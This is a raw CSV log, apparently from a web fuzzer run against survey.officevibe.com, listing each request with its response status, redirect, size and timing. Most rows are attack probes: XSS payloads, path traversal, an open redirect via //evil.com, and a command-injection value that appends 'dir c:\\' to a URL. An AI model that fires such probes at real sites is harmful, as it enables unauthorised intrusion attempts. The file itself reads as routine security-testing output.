FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
?targetURL=https://www.owler.com/iaApp/getDataCard.htm,https://survey.officevibe.com/?targetURL=https://www.owler.com/iaApp/getDataCard.htm,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com%2f%3ftargetURL%3dhttps%3a%2f%2fwww.owler.com%2fiaApp%2fgetDataCard.htm,190572,302,266,6,4,text/html; charset=utf-8,41.08388ms,
servlet/custMsg?guestName=<script>alert(document.cookie)(\,https://survey.officevibe.com/servlet/custMsg?guestName=<script>alert(document.cookie)(\,,197213,500,75,12,1,text/html,61.840115ms,
#/../html,https://survey.officevibe.com/#/../html,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,198439,302,195,6,4,text/html; charset=utf-8,63.315205ms,
#/../www,https://survey.officevibe.com/#/../www,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,203527,302,195,6,4,text/html; charset=utf-8,56.197495ms,
*/?lang.ru,https://survey.officevibe.com/*/?lang.ru,https://survey.officevibe.com/*?lang.ru,203811,301,1386,270,21,text/html; charset=UTF-8,90.423656ms,
#/../manager/html,https://survey.officevibe.com/#/../manager/html,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,205028,302,195,6,4,text/html; charset=utf-8,41.469952ms,
cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>,https://survey.officevibe.com/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>,,205737,500,75,12,1,text/html,95.39585ms,
cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>,https://survey.officevibe.com/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>,,210614,500,75,12,1,text/html,72.457661ms,
email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E,https://survey.officevibe.com/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E,,241606,500,75,12,1,text/html,61.939147ms,
~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,https://survey.officevibe.com/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,,247309,500,1789,370,41,text/html; charset=utf-8,71.067175ms,
post32.exe|dir%20c:\\,https://survey.officevibe.com/post32.exe|dir%20c:\\,https://survey.officevibe.com/post32.exe|dir c:,249375,301,1394,271,21,text/html; charset=UTF-8,59.871123ms,
https://url.com/redirect/?url=http://twitter.com,https://survey.officevibe.com/https://url.com/redirect/?url=http://twitter.com,https://survey.officevibe.com/https:/url.com/redirect?url=http://twitter.com,265420,301,1423,270,21,text/html; charset=UTF-8,65.359439ms,
/evil.com/%2F..,https://survey.officevibe.com//evil.com/%2F..,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,272876,302,195,6,4,text/html; charset=utf-8,44.433535ms,
